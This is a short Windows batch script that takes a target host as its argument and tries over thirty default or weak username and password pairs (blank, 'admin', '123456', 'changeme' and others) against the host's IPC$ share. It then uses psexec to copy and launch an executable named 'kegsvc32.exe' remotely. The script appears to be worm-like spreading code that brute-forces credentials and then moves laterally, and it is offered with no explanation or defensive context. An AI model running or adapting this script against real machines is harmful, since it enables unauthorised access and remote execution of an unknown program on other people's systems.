@echo off
net use /del \\%1\ipc$
net use \\%1\ipc$ "" /user:administrator
net use \\%1\ipc$ "" /user:administrateur
net use \\%1\ipc$ "" /user:admin
net use \\%1\ipc$ "" /user:wwwadmin
net use \\%1\ipc$ "" /user:database
net use \\%1\ipc$ "" /user:user
net use \\%1\ipc$ "" /user:test
net use \\%1\ipc$ "" /user:root
net use \\%1\ipc$ "" /user:server
net use \\%1\ipc$ "admin" /user:wwwadmin
net use \\%1\ipc$ "wwwadmin" /user:wwwadmin
net use \\%1\ipc$ "database" /user:database
net use \\%1\ipc$ "admin" /user:database
net use \\%1\ipc$ "user" /user:user
net use \\%1\ipc$ "admin" /user:user
net use \\%1\ipc$ "admin" /user:Administrator
net use \\%1\ipc$ "admin" /user:administrator
net use \\%1\ipc$ "admin123" /user:administrator
net use \\%1\ipc$ "password" /user:administrato
net use \\%1\ipc$ "administrator" /user:administrator
net use \\%1\ipc$ "changeme" /user:administrator
net use \\%1\ipc$ "private" /user:administrator
net use \\%1\ipc$ "root" /user:root
net use \\%1\ipc$ "admin" /user:admin
net use \\%1\ipc$ "1" /user:administrator
net use \\%1\ipc$ "12" /user:administrator
net use \\%1\ipc$ "123" /user:administrator
net use \\%1\ipc$ "1234" /user:administrator
net use \\%1\ipc$ "12345" /user:Administrator
net use \\%1\ipc$ "123456" /user:administrator
net use \\%1\ipc$ "secret" /user:administrator
net use \\%1\ipc$ "test" /user:test
net use \\%1\ipc$ "test123" /user:test
psexec \\%1 -f -c -d kegsvc32.exe -o
psexec \\%1 -d kegsvc32.exe.exe -o